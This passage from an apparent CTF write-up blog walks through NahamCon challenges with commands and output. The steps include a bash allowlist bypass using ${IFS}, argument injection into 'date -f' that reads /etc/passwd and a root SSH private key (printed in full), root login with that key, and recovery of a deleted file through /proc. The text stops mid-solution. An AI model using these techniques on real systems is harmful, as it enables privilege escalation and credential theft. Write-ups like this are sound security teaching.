this, we might be able to learn Jonah\u0026rsquo;s zip code. We can convert the barcode using this decoder key, then submitting it to an online decoder tool:\nDecoding our letter: FDFFDDFFDDDDFFDDDFFDDDDDFFDDDFFDDDFFDDFDFDDFFDDFDDFF\nUsing dcode.fr to decode:\nWe see the 9-digit zip as 606611234. This is known as ZIP+4, as the last 4 digits are extra specifiers to pinpoint a subsection within a regular ZIP address. The flag is only asking for the zip address with an example of 5 digits, so we submit the ZIP without the +4 appended: uiuctf{60661}.\n","date":"2023-07-03T11:37:04-05:00","permalink":"https://yuwenmichael.netlify.app/post/uiuctf_2023/","title":"UIUCTF_2023"},{"content":"Warmup Fast Hands Author: @JohnHammond#6971\nYou can capture the flag, but you gotta be fast!\nWe are given a button to Capture The Flag:\nClicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a curl request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url. I decided to see how this action is behaving when redirected through burp:\nInterception does indeed work great. We can see on click, we are redirected to /capture_the_flag.html.\nWhen we manually follow the link:\nIt\u0026rsquo;s another button, but doesn\u0026rsquo;t appear to be working too well. Viewing page source with Ctrl+U, we can see the flag within the code:\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;div class=\u0026#34;container p-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text-center mt-5 p-5\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;ctf()\u0026#34; class=\u0026#34;btn btn-success\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Your flag is:\u0026lt;br\u0026gt; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp; \u0026lt;span style=\u0026#34;display:none\u0026#34;\u0026gt; flag{80176cdf1547a9be54862df3568966b8} \u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; flag{80176cdf1547a9be54862df3568966b8}\nAlternatively, we could have curled http://challenge.nahamcon.com:31565/capture_the_flag.html to achieve the same results.\n1 2 3 4 $ curl -s http://challenge.nahamcon.com:31565/capture_the_flag.html | grep flag \u0026lt;button type=\u0026#34;button\u0026#34; onclick=\u0026#34;ctf()\u0026#34; class=\u0026#34;btn btn-success\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Your flag is:\u0026lt;br\u0026gt; flag{80176cdf1547a9be54862df3568966b8} Glasses Author: @JohnHammond#6971\nEverything is blurry, I think I need glasses!\nVisiting the page gives us a very non-interactive page where we might buy glasses. Checking the source code with ctrl+U is an absolute mess. However, since everything I interact with does not take me anywhere new, I want to view html code on the page. Using right click to inspect has an interesting interaction:\nWhat\u0026rsquo;s even more interesting is this does nothing. I still get to inspect anyways.\nAfter leafing through the code a little bit, I do indeed find a piece that is interesting:\n1 2 3 4 5 6 \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt; Can\u0026#39;t see things because they are too blurry? Is your vision foggy, and everything looks like \u0026lt;em\u0026gt;this?\u0026lt;/em\u0026gt; \u0026lt;span style=\u0026#34;color: transparent;text-shadow: 0 0 5px rgba(0,0,0,0.09);text-decoration: line-through;\u0026#34;\u0026gt;flag½₧8084e4530cf649814456f2a291eb81e9½―\u0026lt;/span\u0026gt; \u0026lt;br\u0026gt; Test your vision with glasses! Try on this pair and see if you can see the previous sample text... you might find a lot of value! Imagine the world where you can see clearly! Here is the same selection displayed on the webpage:\nThe color of our flag is transparent on top of white, and perhaps might be microscopically tiny as well. Either way, it is evident once we inspect the properties on the page. flag{8084e4530cf649814456f2a291eb81e9}\nRegina Author: @JohnHammond#6971\nI have a tyrannosaurus rex plushie and I named it Regina! Here, you can talk to it :)\nEntering the challenge, we are greeted with a banner:\n1 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) A quick google search shows this is a rather popular interpreter that I have never heard of. It has a very thorough man page located here. However, no matter what my input is, I cannot seem to get a response. I learned the proper syntax that should work for testing purposes, but nothing connects back:\n1 2 3 4 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) Say \u0026#34;Test\u0026#34; client_loop: send disconnect: Broken pipe After trying things for quite a while, right before giving up, I miraculously stumbled upon a response somehow:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) \u0026#39;say test\u0026#39; ; run \u0026#39;say test\u0026#39;; Say \u0026#34;Test\u0026#34;; exec run ; go ^F mysh: say: not found ^Fmy my sh: RUN: not found sh: say: not found Test sh: EXEC: not found sh: RUN: not found Ssh: GO: not found Connection to challenge.nahamcon.com closed. While just enough to keep me from giving up, I had a lot of trouble recreating this still. While I had pressed ^F in the cli, I was under the impression that I also had pressed ^D and this keystroke was important for the execution. However, simply pressing ^D on its own ended up terminating the ssh connection.\nEventually I landed on a goofy pattern to execute, where I write my commands, quickly press the enter key two times, immediately followed by ^D, then another enter stroke. With this, my commands would be executed and then the connection terminated.\n1 2 3 4 5 6 7 8 9 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;ls\u0026#34; Say \u0026#34;Test\u0026#34; flag.txt Test Connection to challenge.nahamcon.com closed. 1 2 3 4 5 6 7 8 9 10 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;cat flag.txt\u0026#34; Say \u0026#34;Test\u0026#34; flag{2459b9ae7c704979948318cd2f47dfd6} Test Connection to challenge.nahamcon.com closed. CTRL+D is commonly used for exiting programs, so it is somewhat sensible that it finalizes REXX-Regina for execution. Was this intended, though? It certainly felt like a strange way to interact.\nMisc Goose Chase Author: @JohnHammond#6971\nI am truly sorry. I really do apologize\u0026hellip; I hope you can bear with me as I set you all loose together, on a communal collaboriative wild goose chase.\nWithin the google sheet, we see a hidden sheet if we check the bottom left:\nIt seems there is no way to view this as long as it is owned by somebody else, but it is possible to clone it into my own google sheet:\nUnder our copied version, we can make the hidden sheet viewable. Within the hidden sheet seems to be a formula importing from another sheet, only viewable after turning on formulas (View -\u0026gt; Show -\u0026gt; Formulas).\nFollowing this page again looks like an empty sheet. Just to be sure, i exported the sheet to a csv. Without editing the saved file, I learned that the flag was present in the file name:\n1 Goose Chase - Google Sheets - ... - Google Sheets - ... flag{323264294cc2a4ebb2c8d5f9e0afb0f7} - Google Sheets - Goose Chase.csv It isn\u0026rsquo;t obvious until I had exported, but it appears the flag was buried deep within the title name of the second sheet project. This can be verified using browser view, the flag is also present on hovering over the window:\nflag{323264294cc2a4ebb2c8d5f9e0afb0f7}\nOne Zero Author: @JohnHammond#6971\nYou only get one zero. ;)\nNOTE, This solution utilizes an unintended interaction.\nWe are given a file to see the restrictions placed. Once we are ready to give it a try, we ssh to their designated port.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 shopt -s extdebug function one_zero() { if [[ \u0026#34;$BASH_COMMAND\u0026#34; =~ ^[\\$\\\u0026amp;+:\\;=\\?@\\#|\\\u0026lt;\\\u0026gt;.\\^\\*()\\%\\!0-]+ ]]; then num_zero=$(awk \u0026#39;{print gsub(/0/, \u0026#34;\u0026#34;)}\u0026#39; \u0026lt;\u0026lt;\u0026lt; \u0026#34;$BASH_COMMAND\u0026#34;) if [[ $num_zero -le 1 ]]; then return; else echo \u0026#34;You are only allowed one zero. :)\u0026#34; return 1; fi fi echo \u0026#34;Sorry, you used a character that is not in the allowlist!\u0026#34; return 1; } trap \u0026#39;one_zero\u0026#39; DEBUG We can see there is a very strict character on the allowlist, but also that more than 1 zero and we trip the 2nd if statement, telling us only 1 zero allowed.\nJumping right in I learned that we can still pass env variables:\n1 2 3 4 user@one_zero:~$ $TERM bash: xterm-256color: command not found user@one_zero:~$ $HOME bash: /home/user: Is a directory In these cases, I don\u0026rsquo;t even need my precious zero! But what to do with them? The answer is not so clear. Next I found that I can append letter characters after a zero, and I still bypass the allowlist:\n1 2 user@one_zero:~$ 0whoami bash: 0whoami: command not found So far nothing is workable. After attempting some other additional operators:\n1 2 3 user@one_zero:~$ 0||whoami bash: 0: command not found Sorry, you used a character that is not in the allowlist! My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.\nI know the bash special variable $IFS is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:\n1 2 3 4 user@one_zero:~$ ${IFS}whoami user user@one_zero:~$ ${IFS}ls flag.txt In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter! From here it\u0026rsquo;s a simple cat away:\n1 2 user@one_zero:~$ ${IFS}cat flag.txt flag{81b9de37f5bd218c9f59ac2d9d709bf6} Wordle Bash Author: @JohnHammond#6971\nWe put a new novel spin on the old classic game of Wordle! Now it\u0026rsquo;s written in bash! :D\nOh, and you aren\u0026rsquo;t guessing words, this time\u0026hellip;\nUpon ssh, we find the wordle challenge. It\u0026rsquo;s umpiled shell code, so firstly let\u0026rsquo;s take a look:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 #!/bin/bash YEARS=(\u0026#34;2020\u0026#34; \u0026#34;2021\u0026#34; \u0026#34;2022\u0026#34; \u0026#34;2023\u0026#34; \u0026#34;2024\u0026#34; \u0026#34;2025\u0026#34;) MONTHS=(\u0026#34;01\u0026#34; \u0026#34;02\u0026#34; \u0026#34;03\u0026#34; \u0026#34;04\u0026#34; \u0026#34;05\u0026#34; \u0026#34;06\u0026#34; \u0026#34;07\u0026#34; \u0026#34;08\u0026#34; \u0026#34;09\u0026#34; \u0026#34;10\u0026#34; \u0026#34;11\u0026#34; \u0026#34;12\u0026#34; ) DAYS=(\u0026#34;01\u0026#34; \u0026#34;02\u0026#34; \u0026#34;03\u0026#34; \u0026#34;04\u0026#34; \u0026#34;05\u0026#34; \u0026#34;06\u0026#34; \u0026#34;07\u0026#34; \u0026#34;08\u0026#34; \u0026#34;09\u0026#34; \u0026#34;10\u0026#34; \u0026#34;11\u0026#34; \u0026#34;12\u0026#34; \u0026#34;13\u0026#34; \u0026#34;14\u0026#34; \u0026#34;15\u0026#34; \u0026#34;16\u0026#34; \u0026#34;17\u0026#34; \u0026#34;18\u0026#34; \u0026#34;19\u0026#34; \u0026#34;20\u0026#34; \u0026#34;21\u0026#34; \u0026#34;22\u0026#34; \u0026#34;23\u0026#34; \u0026#34;24\u0026#34; \u0026#34;25\u0026#34; \u0026#34;26\u0026#34; \u0026#34;27\u0026#34; \u0026#34;28\u0026#34; \u0026#34;29\u0026#34; \u0026#34;30\u0026#34; \u0026#34;31\u0026#34;) YEARS_SIZE=${#YEARS[@]} YEARS_INDEX=$(($RANDOM % $YEARS_SIZE)) YEAR=${YEARS[$YEARS_INDEX]} MONTHS_SIZE=${#MONTHS[@]} MONTHS_INDEX=$(($RANDOM % $MONTHS_SIZE)) MONTH=${MONTHS[$MONTHS_INDEX]} DAYS_SIZE=${#DAYS[@]} DAYS_INDEX=$(($RANDOM % $DAYS_SIZE)) DAY=${DAYS[$DAYS_INDEX]} TARGET_DATE=\u0026#34;${YEAR}-${MONTH}-${DAY}\u0026#34; gum style \\ --foreground 212 --border-foreground 212 --border double \\ --align center --width 50 --margin \u0026#34;1 2\u0026#34; --padding \u0026#34;2 4\u0026#34; \\ \u0026#39;WORDLE DATE\u0026#39; \u0026#39;Uncover the correct date!\u0026#39; echo \u0026#34;We\u0026#39;ve selected a random date, and it\u0026#39;s up to you to guess it!\u0026#34; wordle_attempts=1 while [ $wordle_attempts -le 5 ] do echo \u0026#34;Attempt $wordle_attempts:\u0026#34; echo \u0026#34;Please select the year you think we\u0026#39;ve chosen:\u0026#34; chosen_year=$(gum choose ${YEARS[@]}) echo \u0026#34;Now, enter the month of your guess: \u0026#34; chosen_month=$(gum choose ${MONTHS[@]}) echo \u0026#34;Finally, enter the day of your guess: \u0026#34; chosen_day=$(gum choose ${DAYS[@]}) guess_date=\u0026#34;$chosen_year-$chosen_month-$chosen_day\u0026#34; if ! date -d $guess_date; then echo \u0026#34;Invalid date! Your guess must be a valid date in the format YYYY-MM-DD.\u0026#34; exit fi confirmed=1 while [ $confirmed -ne 0 ] do gum confirm \u0026#34;You\u0026#39;ve entered \u0026#39;$guess_date\u0026#39;. Is that right?\u0026#34; confirmed=$? if [[ $confirmed -eq 0 ]] then break fi echo \u0026#34;Please select the date you meant:\u0026#34; guess_date=$(gum input --placeholder $guess_date) done if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]]; then gum style \\ --foreground 212 --border-foreground 212 --border double \\ --align center --width 50 --margin \u0026#34;1 2\u0026#34; --padding \u0026#34;2 4\u0026#34; \\ \u0026#34;Congratulations, you\u0026#39;ve won! You correctly guessed the date!\u0026#34; \u0026#39;Your flag is:\u0026#39; $(cat /root/flag.txt) exit 0 else echo \u0026#34;Sorry, that wasn\u0026#39;t correct!\u0026#34; echo \u0026#34;=====================================\u0026#34; fi wordle_attempts=$((wordle_attempts+1)) done gum style \\ --foreground 212 --border-foreground 212 --border double \\ --align center --width 50 --margin \u0026#34;1 2\u0026#34; --padding \u0026#34;2 4\u0026#34; \\ \u0026#34;Sorry, you lost.\u0026#34; \u0026#34;The correct date was $TARGET_DATE.\u0026#34; We can see the dates are generated \u0026ldquo;randomly\u0026rdquo; upon launch, so my first thought is to run 2 instances simultaneously. If the dates can match up, then it will be an easy win:\n1 user@wordle:~$ ./wordle_bash.sh \u0026amp; ./wordle_bash.sh It works as expected, but I hadn\u0026rsquo;t considered that in order to see the flag it had to be run as sudo. A quick check on sudo privs shows me that I am indeed capable:\n1 2 3 4 user@wordle:~$ sudo -l \u0026lt;... SNIP ...\u0026gt; User user may run the following commands on wordle-bash-d18d8fe5e302e98a-89966b69d-lv5gw: (root) /home/user/wordle_bash.sh However, running 2 sudo instances became very problematic, as I am asked for password on every launch. If one sudo process is immediately sent to bg, it will fail to launch once i try to fg, since the password had not really been submitted.\nAfter spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control. I noticed that after selecting dates, you are asked confirmation. If you say no, you can supply your own input with interesting results:\n1 2 3 4 5 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-d $TARGET_DATE +%Y-%m-%d\u0026#39;. Is that right? date: invalid date ‘$TARGET_DATE’ Sorry, that wasn\u0026#39;t correct! The date function seems to be recognizing the -d flag without issue? Perhaps we are able to provide our own arguments to execute.\nThe GTFObins site has a page for date; we might be able to utilize arbitrary read capabilities.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /etc/passwd\u0026#39;. Is that right? date: invalid date ‘root:x:0:0:root:/root:/bin/bash’ date: invalid date ‘bin:x:1:1:bin:/bin:/sbin/nologin’ date: invalid date ‘daemon:x:2:2:daemon:/sbin:/sbin/nologin’ date: invalid date ‘adm:x:3:4:adm:/var/adm:/sbin/nologin’ date: invalid date ‘lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin’ date: invalid date ‘sync:x:5:0:sync:/sbin:/bin/sync’ date: invalid date ‘shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown’ date: invalid date ‘halt:x:7:0:halt:/sbin:/sbin/halt’ date: invalid date ‘mail:x:8:12:mail:/var/mail:/sbin/nologin’ date: invalid date ‘news:x:9:13:news:/usr/lib/news:/sbin/nologin’ date: invalid date ‘uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin’ date: invalid date ‘operator:x:11:0:operator:/root:/sbin/nologin’ date: invalid date ‘man:x:13:15:man:/usr/man:/sbin/nologin’ date: invalid date ‘postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin’ date: invalid date ‘cron:x:16:16:cron:/var/spool/cron:/sbin/nologin’ date: invalid date ‘ftp:x:21:21::/var/lib/ftp:/sbin/nologin’ date: invalid date ‘sshd:x:22:22:sshd:/dev/null:/sbin/nologin’ date: invalid date ‘at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin’ date: invalid date ‘squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin’ date: invalid date ‘xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin’ date: invalid date ‘games:x:35:35:games:/usr/games:/sbin/nologin’ date: invalid date ‘cyrus:x:85:12::/usr/cyrus:/sbin/nologin’ date: invalid date ‘vpopmail:x:89:89::/var/vpopmail:/sbin/nologin’ date: invalid date ‘ntp:x:123:123:NTP:/var/empty:/sbin/nologin’ date: invalid date ‘smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin’ date: invalid date ‘guest:x:405:100:guest:/dev/null:/sbin/nologin’ date: invalid date ‘nobody:x:65534:65534:nobody:/:/sbin/nologin’ date: invalid date ‘user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh’ Sorry, that wasn\u0026#39;t correct! With arbitrary read, we should be able to display the contents of the flag.txt as well!\n1 2 3 4 5 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /root/flag.txt\u0026#39;. Is that right? date: invalid date ‘[ Sorry, your flag will be displayed once you have code execution as root ]’ Sorry, that wasn\u0026#39;t correct! Unexpectedly, it looks like flag.txt was a bait after all. It says we must have code execution as root for the flag, but I thought perhaps I can \u0026ldquo;guess\u0026rdquo; the name of the flag file using wildcards:\n1 2 3 4 5 6 7 8 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /root/*\u0026#39;. Is that right? date: the argument ‘/root/get_flag_random_suffix_345674837560870345’ lacks a leading \u0026#39;+\u0026#39;; when using an option to specify date(s), any non-option argument must be a format string beginning with \u0026#39;+\u0026#39; Try \u0026#39;date --help\u0026#39; for more information. Sorry, that wasn\u0026#39;t correct! We find an interesting file name. Once more, using exactly this name:\n1 2 3 4 5 6 7 8 Wed Jan 1 00:00:00 UTC 2020 Please select the date you meant: You\u0026#39;ve entered \u0026#39;-f /root/get_flag_random_suffix_345674837560870345\u0026#39;. Is that right? date: invalid date ‘\\177ELF\\002\\001\\001’ date: invalid date ‘:’ date: invalid date ‘.\\001?\\031\\003\\016:\\v;\\v9\\vI\\023\u0026lt;\\031\\001\\023’ Sorry, that wasn\u0026#39;t correct! This is a binary executable, likely containing our flag once we execute as root. So, clearly, we do indeed need code execution as root.\nEventually, I thought to look for ssh keys in /root/.ssh/id_rsa:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’ date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn’ date: invalid date ‘NhAAAAAwEAAQAAAYEAxllMaPu/ewDglK/+qcskWbUTSiQtLBBX4Ls5EGWmGbTdKh7K7trC’ date: invalid date ‘Nht9hbSx8Ei4cLQWhbbwcvIqDAgrXYO9Vb/sr/BEyk1aVVTpFfLuFbsyZNZTqmONajdsf9’ date: invalid date ‘Kl/4Qy9u8/3duhBYaeV0Am4tK9mzM8/D2YbzmYD+pK8GFwJDQG5RdFstj6NxXjROAsaj8H’ date: invalid date ‘U7HHvkNFctEMMBmquAaG85DZO83ZUWWASB702UNrc701Mhdf7Ln92D2aEhwMisdBjK/F83’ date: invalid date ‘K71YIcrpkuDTQYhms4SGUlYIlUaIhridKH3m3BgCNhC5mjsy5IkV0VwG/SRxew0adhHxT+’ date: invalid date ‘Gc9izi2yy1uW1wrJT0u8ImQhTm35R+cLD+SpWJSHswDxygCVHTUvVIngNakJvWXRKDmS3N’ date: invalid date ‘PjIu9gaJ3D69Q3BDlxcbluhjl2Z/5nenryUZdoVORnCf75YiWgTtI/FhS7HnHyw69LaJoH’ date: invalid date ‘1NPGh/mV730OsnqtdakxkHXd3CDhcwY5QjvJlFEdAAAFgAlNDvEJTQ7xAAAAB3NzaC1yc2’ date: invalid date ‘EAAAGBAMZZTGj7v3sA4JSv/qnLJFm1E0okLSwQV+C7ORBlphm03Soeyu7awjYbfYW0sfBI’ date: invalid date ‘uHC0FoW28HLyKgwIK12DvVW/7K/wRMpNWlVU6RXy7hW7MmTWU6pjjWo3bH/Spf+EMvbvP9’ date: invalid date ‘3boQWGnldAJuLSvZszPPw9mG85mA/qSvBhcCQ0BuUXRbLY+jcV40TgLGo/B1Oxx75DRXLR’ date: invalid date ‘DDAZqrgGhvOQ2TvN2VFlgEge9NlDa3O9NTIXX+y5/dg9mhIcDIrHQYyvxfNyu9WCHK6ZLg’ date: invalid date ‘00GIZrOEhlJWCJVGiIa4nSh95twYAjYQuZo7MuSJFdFcBv0kcXsNGnYR8U/hnPYs4tsstb’ date: invalid date ‘ltcKyU9LvCJkIU5t+UfnCw/kqViUh7MA8coAlR01L1SJ4DWpCb1l0Sg5ktzT4yLvYGidw+’ date: invalid date ‘vUNwQ5cXG5boY5dmf+Z3p68lGXaFTkZwn++WIloE7SPxYUux5x8sOvS2iaB9TTxof5le99’ date: invalid date ‘DrJ6rXWpMZB13dwg4XMGOUI7yZRRHQAAAAMBAAEAAAGAECAzdPeUCOaN264hU2Gcz3RIIL’ date: invalid date ‘InQAVbd6hmX8hmhCwvAkfQR4dehx1ItmWgmoChtNFXYWtO9NwZAghp/3zV7aegZmoaKvkL’ date: invalid date ‘UT5e2DYmGCXeLNI7VBzVjZ9QQWYkBng+LShPYMoEjIP2J0bObTN6pH26cBF77VMD42Cw01’ date: invalid date ‘vrTO4z6ffbO/VQW8kk7zUV4f9vfjpJGyqx9enmsURs8PA1lDjLCIXYV2Sb/4EQzAHOCxyv’ date: invalid date ‘Zfv+LwCsvCIUqXNBVnO+N7hg5b/zh7gyvuzHq/vyOTjkNceQa7SZ/egeclWGkkYttUzUr1’ date: invalid date ‘0cveVqXTM2tfJhv8+cobJcmO7IccjsOyL+zYPR3mN/Q1nUvGyAERppXfhwTAZ5ljMRDkv/’ date: invalid date ‘KUy7IJ3Q9FnSVdqkni2u6ErHEer0/TKXAT92LYQXzTczd6hGvh+IADlmOLzU2d0RfkPZZ4’ date: invalid date ‘8GKvZfThN1OSMVpcwJMVeILWP6uz9WnnUAXgLIUriJK7rrsHpH0MNTmfTT9v5VSH3RAAAA’ date: invalid date ‘wB2od8rr4IU8AkpZ/kE9kY5a/INNsvSdUA6sn/5Fwso19fiPz2vYdP9fJMYjShV1wb8UFt’ date: invalid date ‘cajFvnnj2DnClU0imh1eC0fB5+vAmJvx8Qq9NWcmz7aejvZrBdIFbqGYr5krc5KvmizYVC’ date: invalid date ‘+tII4u4s5SFcvcZwmuIsWJQjbXA7VVa8v8Y10YJdeYsl3YpKqJdU0xPkt2Y2IgZxTJ4Dd9’ date: invalid date ‘MKgcPTBdOVuKA8r8ALCth9OV74k1GOEpLbDIY4gFiXbi7crQAAAMEA2Z0ZtNS6bUEq61DF’ date: invalid date ‘6758uI3wIeYe8NoGyxlH/oTGVqy5KfQ9vCochcSx0yov4MSZBY+foE8OAxNvAxBSV+2CnQ’ date: invalid date ‘4OHnZnKa9teSvphUCmnt4Va7CWRzmVmNiKlpMOky2P8Zfv3LdgpwrAbwxBL1HQv/eivXDm’ date: invalid date ‘0BQCxuiaOp5/3nz+K+IvA/cBhsJwS6bWMtAhcfzKfS7/NzgcLTtlVR1Li/vC/r69iDs/xi’ date: invalid date ‘zDGCjuOrjsWhqqIqjhMGZjguTz9Y+FAAAAwQDpVj6g1OSqzZ5Kw805VTcbRRTmiHb00hht’ date: invalid date ‘U4LYw5xV+1iNJ8/BijiIZaT/zXnZbzIzLBnPbzqNLW5sBPJ+eMo5wY5ZNKa/qMd4Rdj6Hx’ date: invalid date ‘pAVbuqv6sYPhj2Xl6R/yJUVRw6OGoIa0SEumrmXzbJTT25o9FgItuKOpRRWd9l4gB8Pa1I’ date: invalid date ‘LLomZzqAmpdZtcMX+ihYPAJL5UBGPkD4CO7JwHm+W36NpAEKhi/Fh6D/U/RPEtwXZEbaWY’ date: invalid date ‘vIJis7FbO7UrkAAAAJa2FsaUBrYWxpAQI=’ date: invalid date ‘-----END OPENSSH PRIVATE KEY-----’ Sorry, that wasn\u0026#39;t correct! Very nicely, the whole key is here. from this point it\u0026rsquo;s a matter of creating the cleaned id_rsa file and using it to ssh as root.\n1 2 3 4 5 6 7 8 9 $ ssh -p 32726 -i id_rsa root@challenge.nahamcon.com root@wordle:~# cd /root root@wordle:~# ls flag.txt get_flag_random_suffix_345674837560870345 root@wordle:~# ./get_flag_random_suffix_345674837560870345 Please press Enter within one second to retrieve the flag. flag{2b9576d1a7a631b8ce12595f80f3aba5} There is even the extra precaution of needing to press Enter after running in order to retrieve the password. They were quite thorough in wanting you to have execution as root.\nflag{2b9576d1a7a631b8ce12595f80f3aba5}\nZombie Author: @JohnHammond#6971\nOh, shoot, I could have sworn there was a flag here. Maybe it\u0026rsquo;s still alive out there?\nLogging in, we see an interesting .user-entrypoint.sh file:\n1 2 3 4 5 6 7 user@zombie:~$ ls -al total 24 drwxr-sr-x 1 user user 4096 Jun 15 22:23 . drwxr-xr-x 1 root root 4096 Jun 14 17:52 .. -rwxr-xr-x 1 user user 3846 Jun 14 17:52 .bashrc -rw-r--r-- 1 user user 17 Jun 14 17:52 .profile -rwxr-xr-x 1 root root 131 Jun 14 17:52 .user-entrypoint.sh the contents:\n1 2 3 4 5 6 7 8 9 user@zombie:~$ cat ~/.user-entrypoint.sh #!/bin/bash nohup tail -f /home/user/flag.txt \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; # disown rm -f /home/user/flag.txt 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null bash -i This looks like something that might be run upon entry. Just to check we can see our default terminal in /etc/passwd:\n1 2 user@zombie:~$ cat /etc/passwd | grep user user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh Looks like this did indeed run and we can see very clearly the rm function getting rid of the flag. oops. Also notable is the tail -f . The -f flag is a live following, or reading the final lines of the file. We can also see a trailing \u0026amp;, meaning this has been set to background. As for nohup:\n1 2 3 4 5 6 $ nohup BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary. Usage: nohup PROG ARGS Run PROG immune to hangups, with output to a non-tty We can see this prevents accidental closings. This process is likely still running.\n1 2 3 4 5 6 7 8 9 10 user@zombie:~$ ps PID USER TIME COMMAND 1 root 0:00 /usr/sbin/sshd -D -e 7 root 0:00 sshd: user [priv] 9 user 0:00 sshd: user@pts/0 10 user 0:00 {.user-entrypoin} /bin/bash /home/user/.user-entrypoint.sh -c bash 11 user 0:00 tail -f /home/user/flag.txt 13 user 0:00 bash -i 18 user 0:00 bash 25 user 0:00 ps We do indeed see this process still running with a PID 11. My thinking is perhaps we can see the contents by exploring the PID in /proc/\n1 2 3 4 5 6 user@zombie:~$ cd /proc/11/ user@zombie:/proc/11$ ls arch_status clear_refs cpuset fd limits mem net oom_score projid_map setgroups stat task uid_map attr cmdline cwd fdinfo loginuid mountinfo ns oom_score_adj root smaps statm timens_offsets wchan auxv comm environ gid_map map_files mounts numa_maps pagemap schedstat smaps_rollup status timers cgroup coredump_filter exe io maps mountstats oom_adj personality sessionid stack syscall timerslack_ns fd refers to file descriptors, which might contain info from stdin, stdout, etc.\n1 2 3 4 5 6 7 8 9 10 11 user@zombie:/proc/11$ cd fd user@zombie:/proc/11/fd$ ls 0 1 2 3 